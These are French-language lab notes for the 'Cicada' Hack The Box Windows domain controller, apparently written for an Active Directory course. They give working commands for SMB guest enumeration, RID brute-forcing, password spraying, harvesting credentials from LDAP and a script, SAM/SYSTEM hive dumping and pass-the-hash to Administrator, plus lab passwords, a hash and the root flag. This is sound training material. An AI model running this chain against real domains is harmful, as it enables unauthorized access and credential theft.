# Cicada — Notes (HTB, Easy, Windows AD)

> Box de pratique pour la section **Énumération initiale du domaine** (cours AD).
> Lien cours : (à compléter dans le write-up final)

## Cible
- IP : `10.129.231.149`
- Domaine : `cicada.htb`
- DC : `CICADA-DC` (Windows Server 2022, Build 20348)

## Phase 1 — Recon (Nmap)
Ports ouverts : 53 (DNS), 88 (Kerberos), 135 (MSRPC), 139 (NetBIOS), 389/636 (LDAP/LDAPS),
445 (SMB), 464 (kpasswd), 593 (RPC/HTTP), 3268/3269 (Global Catalog), 5985 (WinRM).
→ Confirmé : contrôleur de domaine `cicada.htb`.

## Phase 2 — Énumération SMB
- Guest activé (`Null Auth: True`).
- Partages :
  - `HR` → **READ** (guest)
  - `IPC$` → READ
  - `DEV` → existe (pas d'accès guest)
  - ADMIN$, C$, NETLOGON, SYSVOL → pas d'accès
- Commandes :
  ```bash
  smbclient -N -L //$IP
  nxc smb $IP -u 'guest' -p '' --shares
  ```

## Trouvailles (credentials, users, fichiers)
- Partage `HR` → `Notice from HR.txt` : mot de passe par défaut des nouveaux arrivants.
  - **Mot de passe par défaut : `Cicada$M6Corpb*@Lp#nZp!8`** (sans username associé → spraying)

## Phase 3 — Énumération des utilisateurs + password spraying
- RID cycling (guest) → liste de comptes :
  `john.smoulder, sarah.dantelia, michael.wrightson, david.orelious, emily.oscars` (+ comptes système).
  ```bash
  nxc smb $IP -u 'guest' -p '' --rid-brute | grep SidTypeUser
  ```
- Password spraying du mot de passe par défaut sur tous les comptes :
  ```bash
  nxc smb $IP -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
  ```
  (`--continue-on-success` = teste tous les comptes même après un succès)
- **Compte valide : `michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8`** (user standard, pas admin)

## Chemin d'attaque
1. Guest → partage HR → mot de passe par défaut.
2. RID brute → liste d'users → spraying → creds `michael.wrightson`.
3. Énum LDAP authentifiée (michael) → mot de passe en clair dans le champ `description` de `david.orelious`.
   ```bash
   nxc ldap $IP -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
   ```
   → **`david.orelious : aRt$Lp#7t*VQ!3`**
   (michael : pas de WinRM)
4. david a accès **READ** au partage `DEV` → `Backup_script.ps1` avec creds en dur.
   ```bash
   nxc smb $IP -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
   smbclient //$IP/DEV -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3'
   ```
   → **`emily.oscars : Q!3@Lp#M6b*7t*Vt`**
   (david : pas de WinRM)
5. emily.oscars → **WinRM (Pwn3d!)** → shell evil-winrm → **user flag**.
   ```bash
   nxc winrm $IP -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
   evil-winrm -i $IP -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
   ```
   (home réel : `C:\Users\emily.oscars.CICADA`)

## Phase 4 — Escalade de privilèges (SeBackupPrivilege)
- `whoami /priv` → **SeBackupPrivilege** + SeRestorePrivilege activés.
- Principe : `SeBackupPrivilege` autorise la lecture de fichiers protégés en passant par l'API de
  backup (contournement des ACL). → récupérer `SAM` + `SYSTEM` → extraire le hash NT de l'Administrateur
  → Pass-the-Hash.

### Étape 1 — Sauvegarde des hives (shell evil-winrm emily.oscars)
```powershell
mkdir C:\Temp
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
download C:\Temp\sam.hive
download C:\Temp\system.hive
```
Note : l'erreur « unable to find the specified registry key » signifie en fait que le dossier de
destination (`C:\Temp`) n'existe pas — d'où le `mkdir` d'abord.

### Étape 2 — Extraction du hash NT (machine d'attaque)
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
Sortie (compte RID 500) :
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```
→ **Hash NT Administrator : `2b87e7c93a3e8a0ea4a581937016f341`** (4ᵉ champ ; le LM `aad3b435...` est vide).

### Étape 3 — Pass-the-Hash → shell Administrateur
On rejoue le hash NT comme preuve d'identité NTLM (pas de crack du mot de passe).
```bash
evil-winrm -i $IP -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
Piège : passer **uniquement** le hash NT à `-H`, sans les `:::` de fin (sinon « Invalid hash format »).

## Flags
- **User** (`emily.oscars`) : `C:\Users\emily.oscars.CICADA\Desktop\user.txt`
- **Root** (`Administrator`) : `C:\Users\Administrator\Desktop\root.txt` → **`fbbc0fca011d5100a40c7ded9ad9323b`**

## Récap du chemin complet
guest → partage HR (mdp par défaut) → RID brute + spraying → `michael.wrightson` →
LDAP (`description`) → `david.orelious` → partage DEV (`Backup_script.ps1`) → `emily.oscars` →
WinRM + `SeBackupPrivilege` → dump SAM/SYSTEM → PtH Administrator → **root**.
